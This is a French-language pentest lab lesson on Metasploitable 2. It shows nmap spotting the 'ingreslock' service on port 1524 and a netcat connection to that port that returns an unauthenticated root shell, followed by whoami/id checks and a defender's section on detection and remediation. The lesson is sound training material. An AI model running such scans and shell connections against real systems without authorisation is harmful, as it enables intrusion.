Si le cours #1 est déjà fait, les VM sont encore sur le même segment. Sinon, refaire la mise en réseau avant tout.

Ici, ingreslock est immédiatement suspect — nom exotique, port inattendu, version indéterminée.
3

Identifier le service — ingreslock

ingreslock est un nom de service obsolète associé à une base de données Ingres. Sur Metasploitable 2, ce port est détourné pour exposer un shell root.

kali@kali
$ nmap -sV -p 1524 192.168.56.20
PORT     STATE SERVICE    VERSION
1524/tcp open  ingreslock?
ingreslockservice historiquement associé au SGBD Ingres (port 1524/tcp officiellement réservé). Mais aucune base Ingres ne tourne sur cette machine — la simple présence de ce nom est une anomalie. anomalieUn service qui écoute en clair sur un port documenté mais dont le nom ne correspond à rien de connu sur cette machine mérite une vérification manuelle immédiate.
4

Vérification — netcat

Pas de module Metasploit, pas de recherche d'exploit : une simple connexion TCP suffit à savoir à quoi on a affaire.

kali@kali
$ nc 192.168.56.20 1524
root@metasploitable:/# whoami
root
ncl'outil netcat ouvre une connexion TCP brute. Aucune négociation de protocole, aucun handshake applicatif — juste un tuyau vers le port cible. résultatle service renvoie un prompt shell direct, sans mot de passe ni session préalable. La connexion elle-même est l'exploit. telnettelnet 192.168.56.20 1524 fonctionne aussi — même principe. netcat est simplement plus direct.
5

Post-exploitation immédiate

Vérifier l'identité obtenue, puis explorer ce qui est accessible.

root@metasploitable
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/root
whoami / idconfirment l'identité effective du shell. Ici le shell est celui d'un service lancé en root — l'accès est donc direct à uid=0. méthodeToujours vérifier l'identité avant d'agir. Un shell apparemment root peut être bridé par des restrictions supplémentaires (apparmor, chroot, capabilities). Ici, rien de tout ça.

Ce qu'il faut vraiment comprendre

Une backdoor n'est pas toujours une archive piégée

Le cours #1 montrait une archive modifiée après compromission de la chaîne de distribution. Ici, c'est encore plus simple : le service a été délibérément configuré pour écouter sur un port et renvoyer un shell. Pas de code malveillant caché, pas de déclencheur exotique — juste un service qui n'aurait jamais dû être exposé.

Reconnaissance : l'anomalie plutôt que la vulnérabilité

Un scanner liste des dizaines de ports. Tous ne sont pas des failles. Certains — comme ingreslock sur ce port — sont des anomalies de configuration. Le travail du pentester est de repérer ce qui sort de l'ordinaire : un nom de service qui ne correspond pas à la machine, un port non standard, une version indéterminée. C'est ce tri qui mène à la faille, pas la force brute.

Shell direct vs shell reverse

Le cours #1 utilisait un reverse shell : la cible rappelait l'attaquant. Ici, c'est un shell direct : la cible écoute passivement et n'importe qui s'y connecte obtient un prompt. Pas de gestion de LHOST/LPORT, pas de payload à envoyer. Le service est une porte ouverte.

Anatomie de la backdoor

Pourquoi un service peut se retrouver à exposer un shell root sans qu'aucun code malveillant n'ait été injecté.

Un service lancé en root

Sur Metasploitable 2, le port 1524 est associé à un démon qui a été démarré avec les privilèges du compte root. Ce n'est pas une faille du démon lui-même — c'est son mode de déploiement qui est dangereux. Un service censé écouter des connexions ne devrait jamais tourner avec plus de privilèges que nécessaire.

Le port 1524/tcp

Officiellement réservé à ingreslock, un service de verrouillage pour la base de données Ingres. Sur cette machine, aucun SGBD Ingres n'est installé — le port a été réutilisé pour autre chose. C'est cette incohérence entre le nom du service et la réalité de la machine qui doit déclencher l'investigation.

Ce qu'il n'y a pas à faire

Aucun exploit à chercher, aucun module à charger, aucun payload à configurer. La connexion netcat est l'exploit. C'est volontairement l'un des cours les plus simples du lab — pour montrer qu'une faille critique peut tenir en une ligne et que tout le travail se fait avant, en reconnaissance.

Détection & remédiation

Le point de vue du défenseur : comment ce service aurait dû être repéré et ce qui aurait empêché son exposition.

netstat -tulpn / ss -tulpnlister tous les ports en écoute et le processus associé — détecte immédiatement qu'un démon non reconnu écoute sur 1524
lsof -i :1524identifier quel processus a ouvert le port 1524 et sous quel compte il tourne
règle IDS (Snort/Suricata)détecter une connexion entrante sur 1524/tcp et la remonter — aucun trafic légitime ne devrait y transiter
audit des services exposéstout service en écoute sur 0.0.0.0 doit être justifié et documenté — supprimer ou désactiver ce qui n'a pas de raison d'être
moindre privilègene jamais lancer un service avec les droits root s'il n'en a pas strictement besoin — même un service légitime compromis donnerait un accès limité

Terminal d'entraînement

Rejoue la chaîne complète. Le cœur de l'exercice : repérer le bon port dans une sortie nmap dense, puis vérifier ce qu'il expose sans supposer quoi que ce soit.
